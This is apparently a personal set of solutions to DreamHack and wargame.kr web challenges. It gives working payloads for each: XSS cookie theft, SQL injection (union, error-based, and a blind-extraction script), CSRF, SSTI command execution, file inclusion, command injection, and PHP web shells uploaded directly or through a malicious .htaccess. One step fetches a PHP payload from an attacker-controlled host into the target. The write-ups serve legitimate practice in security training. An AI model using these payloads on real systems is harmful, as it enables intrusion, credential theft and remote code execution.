# Level 1 — DreamHack

The levels in in the most solved to least order

## session-basic

Visit `/admin` and get:

```json
{ "2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d": "admin" }
```

Make a curl request:

```bash
curl http://host8.dreamhack.games:8733 -b "sessionid=2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d"
```

## xss-1

Submit `<script>location.href="/memo?memo="+document.cookie</script>` in `/flag`, then visit `/memo` to get the flag.

## simple_sqli

Login with:

```
Username: admin" --
Password: anything
```

## xss-2

Submit `<img src=x onerror="location.href='/memo?memo='+document.cookie">` in `/flag`, then visit `/memo` to get the flag.

## csrf-1

Submit `<img src="/admin/notice_flag?userid=admin">` to trigger the CSRF vulnerability update the `memo_text`, then visit `/memo` to get the flag.

## csrf-2

Submit `<img src="/change_password?pw=1234">` to trigger change password of the admin, then login with:

```
Username: admin
Password: 1234
```

Then get the flag.

## image-storage

Upload a `shell.php`:

```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```

Then visit `/uploads/shell.php?cmd=cat /flag.txt` to get the flag.

## XSS Filtering Bypass

Submit:

```html
<iframe
  src="javascri	pt:locati\u006F\u006E='/memo?memo='+\u0064ocument.cookie;"
/>
```

This payload will bypass the check and get the flag for us.

## simple-ssti

Visit `/%7B%7B%20config.__class__.__init__.__globals__['os'].popen('cat ./flag.txt').read()%20%7D%7D` to get the flag.

## simple_sqli_chatgpt

Use this payload as userlevel:

```
0' AND userid = 'admin' --
```

This will return the flag.

## proxy-1

In `/socket`, host is `127.0.0.1`, port is `8000`, data:

```
POST /admin HTTP/1.1
Host: 127.0.0.1
User-Agent: Admin Browser
DreamhackUser: admin
Cookie: admin=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin
```

## php-1

Visit `/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag` you should see a base64 encoded value, decode it to get the flag.

## error based sql injection

Submit the first payload to get the first part of the flag:

```sql
admin' AND extractvalue(1, concat(0x7e, (SELECT upw FROM user WHERE uid='admin'), 0x7e)) AND '1'='1
```

Submit the second payload to get the second part of the flag:

```sql
admin' AND extractvalue(1, concat(0x7e, substring((SELECT upw FROM user WHERE uid='admin'), 20), 0x7e)) AND '1'='1
```

## command-injection-chatgpt

Submit the payload:

```
0.0.0.0; cat ./flag.py
```

## sql injection bypass WAF

Blind SQL Injection can be used in this challenge:

```python
import requests
import string
import urllib.parse


charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
target_url = "http://host3.dreamhack.games:15683/?uid="
received_flag_content = ""

for i in range(4, 44):
    for char in charset:
        res = requests.get(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")
        print(f"Tried {received_flag_content}{char}")
        print(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")

        if "admin" in res.text:
            received_flag_content += char
            print(f'GOT {received_flag_content}')
            print()
            break

print(f"Flag content {received_flag_content}")
```

## CSRF Advanced

This is the updated challenge with CSRF check however we can take the CSRF by this:

```python
from hashlib import md5

print(md5(("admin" + "127.0.0.1").encode()).hexdigest())
```

Submit payload in `/flag`:

```
<img src="/change_password?pw=1234&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
```

Login as `admin:1234` to get the flag.

## baby-union

Submit payload in `uid` to get tables:

```
' UNION SELECT table_name, 2, 3, 4 FROM information_schema.tables #
```

Found `onlyflag` table. Use payload to get list of columns:

```
' UNION SELECT column_name, 2, 3, 4 FROM information_schema.COLUMNS WHERE table_name = 'onlyflag' #
```

Final payload to get the flag:

```
' UNION SELECT sname, svalue, sflag, sclose FROM onlyflag #
```

However because the third column is hidden which is the `sflag` so reposition it to see the `sflag` value (which is the middle part of the flag):

```
' UNION SELECT sname, svalue, sclose, sflag FROM onlyflag #
```

## Command Injection Advanced

Host a public file `pwn.txt`:

```txt
<?php
// Since /flag is 111 (execute only), we must run it, not read it.
system('/flag');
?>
```

Submit payload:

```
http://<ATTACKER_IP>/pwn.txt -o cache/shell.php
```

Then visit to get the flag:

```
http://host8.dreamhack.games:23798/cache/shell.php
```

## [wargame.kr] login filtering

Login as:

```
Username: Guest
Password: guest
```

## [wargame.kr] strcmp

Use Browser Console to change the input:

```html
<input type="text" name="password[]" value="123" />
```

## File Vulnerability Advanced for linux

Visit `/file?path=../../proc/self/environ` to get the `API_KEY` environment variable.

Then use it in the `/admin` route to get the flag: `/admin?cmd=/flag&API_KEY=<API_KEY>`

## Apache htaccess

Upload malicious `.htaccess`:

```
AddType application/x-httpd-php .png
```

Tells application to treat any `.png` files as `.php`. Upload `shell.png`:

```php
<?php system($_GET['cmd']); ?>
```

Visit `/upload/shell.png?cmd=/flag` to get the flag.

## what-is-my-ip

Use this command to fake IP:

```bash
curl -H "X-Forwarded-For: EVIL_IP" http://host8.dreamhack.games:21370/
```

Get the flag:

```bash
curl -H "X-Forwarded-For: \$(cat /flag)" http://host8.dreamhack.games:21370/
```

## BypassIF

Trigger the exception to get the `KEY`:

```bash
curl -X POST http://host8.dreamhack.games:22666/flag --data-urlencode "key=1" --data-urlencode "cmd_input=sleep 6"
```

Then get the flag:

```bash
curl -X POST http://host8.dreamhack.games:22666/flag --data-urlencode "key=409ac0d96943d3da52f176ae9ff2b974" --data-urlencode "cmd_input="
```

## NoSQL-CouchDB

Use this curl command to get the flag:

```bash
curl -X POST http://host8.dreamhack.games:9144/auth \
     -H "Content-Type: application/json" \
     -d '{"uid": "_all_docs"}'
```

## Type c-j

Submit payload (you may need several tries since the ID will be generated new every time):

```
ID: 0000000000
Password: 00000356
```

## random-test

Brute-force the `locker_num`:

```python
import requests
import string

target_url = "http://host8.dreamhack.games:23474/"

alphanumeric = string.ascii_lowercase + string.digits

got_locker_num = ""
for i in range(0,4):
    for char in alphanumeric:
        print(f"Tried {got_locker_num}{char}")

        res = requests.post(target_url, data={"locker_num": f"{got_locker_num}{char}"})

        if "Good" in res.text:
            print()
            got_locker_num += char
            print(f"Got {got_locker_num}")
            break
```

Brute-force the `password` and get the flag:

```python
import requests

target_url = "http://host8.dreamhack.games:23474/"

locker_num = "r5ky"
for i in range(100,201):

    print(f"Tried {i}")

    res = requests.post(target_url, data={"locker_num": locker_num, "password": i})

    if "FLAG" in res.text:
        print()
        print(f"FOUND {i}!!!")
        print(res.text)
        break
```

## [wargame.kr] tmitter

Sign up with:

```
ID: admin                           z
PS: password123
```

Using `python`:

```python
import requests

URL = "http://host8.dreamhack.games:22898/join.php"

username = "admin" + (" " * 27) + "z"
password = "password123"

data = {
    'id': username,
    'ps': password
}

response = requests.post(URL, data=data)


if "admin is exist" in response.text:
    print("Failed")
else:
    print("Registeration successfully")
```

Then login with:

```
ID: admin
PS: password123
```

## mongoboard

Get `/api/board`:

```json
[
  {
    "_id": "694cd854769d5ba415910334",
    "title": "Hello",
    "author": "guest",
    "secret": false,
    "publish_date": "2025-12-25T06:23:16.077Z"
  },
  {
    "_id": "694cd856769d5ba415910335",
    "title": "Mongo",
    "author": "guest",
    "secret": false,
    "publish_date": "2025-12-25T06:23:18.086Z"
  },
  {
    "_id": null,
    "title": "FLAG",
    "author": "admin",
    "secret": true,
    "publish_date": "2025-12-25T06:23:21.087Z"
  },
  {
    "_id": "694cd85c769d5ba415910337",
    "title": "Good",
    "author": "guest",
    "secret": false,
    "publish_date": "2025-12-25T06:23:24.088Z"
  }
]
```

Calculate the timestamp to predict the `_id` value of the secret.

## [wargame.kr] fly me to the moon

Get flag:

```python
import requests

URL = "http://host8.dreamhack.games:13234"

session = requests.Session()

response = session.get(f"{URL}/token.php")
token = response.text

print(f"Token: {token}")

data = {
    "token": token,
    "score": 999999
}

res = session.post(f"{URL}/high-scores.php", data=data)

print(res.text)
```

## out of money

Loan (1000) -> Convert all to Dnyang Coin -> Return as collateral -> Split the Dnyang Coin loan into several installments (over 2000) -> Return to Santa Private Exchange and return 1000 to DHH -> Pay off debt -> Similarly, if you return Dnyang Coin to DHH, the debt will be 0, and DHH will be 1000 -> You can obtain a flag!

## simple-phparse

Visit `//flag.php` to get the flag.

## Base64 based

Base64 encoded `./flag.php`:

```
Li9mbGFnLnBocA==
```

Then visit `/index.php?file=Li9mbGFnLnBocA==` to get the flag.

## amocafe

Use function to get the menu number:

```python
def solve_menu(menu_str):
    def parse(index, nibbles):
        if index == len(menu_str):
            if len(nibbles) == 16:
                return nibbles
            return None

        if len(nibbles) >= 16:
            return None

        char = menu_str[index]

        val = None
        if char == '_': val = 11
        elif 'c' <= char <= 'f': val = int(char, 16)
        elif char in '023456789': val = int(char)

        if val is not None:
            return parse(index + 1, nibbles + [val])

        if char == '1':
            res = parse(index + 1, nibbles + [1])
            if res: return res
            if index + 1 < len(menu_str) and menu_str[index+1] == '0':
                res = parse(index + 2, nibbles + [10])
                if res: return res

        return None

    result = parse(0, [])

    hex_str = "".join([hex(x)[2:] for x in result])

    final_int = int(hex_str, 16)
    print(f"Calculated Input: {final_int}")
```

Then submit it to get the flag.

## baby-Case

```bash
curl -X POST "http://host3.dreamhack.games:20701/shoP" -d "leg=flag"
```
